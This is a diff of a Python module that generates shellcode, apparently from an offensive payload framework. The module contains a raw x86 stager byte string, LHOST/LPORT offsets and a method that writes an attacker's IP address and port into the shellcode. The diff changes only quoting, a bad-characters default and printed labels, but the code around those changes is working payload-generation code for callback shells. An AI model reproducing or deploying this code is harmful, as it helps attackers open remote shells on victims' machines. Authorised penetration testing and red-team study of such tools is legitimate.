@@ -24,7 +24,7 @@ class ShellcodeModule:
         self.lport_offset = 201
         self.exitfunc_offset = 226
         self.exit_func = '\xf0\xb5\xa2\x56'
-        self.customized_shellcode = ''
+        self.customized_shellcode = ""
         self.stager = (
             b"\xFC\xE8\x86\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
             b"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
@@ -48,7 +48,7 @@ class ShellcodeModule:
             "LHOST": ["", "LHOST value"],
             "LPORT": ["", "LPORT value"],
             "Encoder": ["None", "Optional: Encoder to use when avoiding bad characters"],
-            "BadChars": ["X", "Optional: Bad characters to avoid"]
+            "BadChars": ["\\x00", "Optional: Bad characters to avoid"]
         }
 
     def cli_gen_shellcode(self):
@@ -69,16 +69,16 @@ class ShellcodeModule:
 
     def payload_stats(self):
         '''Prints payload stats'''
-        print("Payload Name: " + helpers.color(self.name))
-        print("IP Address: " + helpers.color(self.required_options['LHOST'][0]))
-        print("Port: " + helpers.color(str(self.required_options['LPORT'][0])))
-        print("Shellcode Size: " + helpers.color(str(len(self.customized_shellcode) / 4).rstrip('.0') + '\n'))
+        print(" [*] Payload Name: " + helpers.color(self.name))
+        print(" [*] IP Address: " + helpers.color(self.required_options['LHOST'][0]))
+        print(" [*] Port: " + helpers.color(str(self.required_options['LPORT'][0])))
+        print(" [*] Shellcode Size: " + helpers.color(str(len(self.customized_shellcode) / 4).rstrip('.0') + '\n'))
         print(self.customized_shellcode)
         return
 
     def payload_gen(self):
         # Take the passed in attributes and gen shellcode
-        ip_shellcode = ''
+        ip_shellcode = ""
         n = 2
         ip_shellcode_stage = binascii.hexlify(socket.inet_aton(self.required_options["LHOST"][0]))
         ip_shellcode_stage = [ip_shellcode_stage[i:i + n] for i in range(0, len(ip_shellcode_stage), n)]
